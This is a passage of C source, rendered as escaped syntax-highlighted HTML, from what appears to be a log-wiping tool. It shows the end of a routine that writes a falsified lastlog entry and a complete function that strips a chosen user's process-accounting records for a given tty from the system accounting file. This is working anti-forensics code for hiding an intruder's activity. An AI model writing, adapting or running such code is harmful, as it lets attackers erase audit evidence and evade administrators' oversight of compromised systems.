class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_sec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ell_time\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003emktime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003estrncpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ell_host\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ell_host\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef NO_ACCT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * ACCOUNT editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_acct\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eacct\u003c/span\u003e\t\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003ettyn\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e50\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003epasswd\u003c/span\u003e   \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003estat\u003c/span\u003e\t\u003cspan class=\"n\"\u003esbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\t\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eACCT_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the acct file and temporary file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eACCT_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDONLY\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eACCT_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Grab a unique temporary filename.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003etmpnam\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_WRONLY\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eO_CREAT\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eO_TRUNC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e600\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening tmp ACCT file\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003egetpwnam\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Can\u0026#39;t find user in passwd.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Determine tty\u0026#39;s device number\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003estrcpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ettyn\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;/dev/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003estrcat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ettyn\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003estat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ettyn\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003esbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Determining tty device number.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nf\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eac_uid\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003epw_uid\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eac_tty\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003esbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003est_rdev\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eac\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003ecopy_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eACCT_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nf\"\u003eunlink\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etmpf\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Unlinking tmp WTMP file.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan 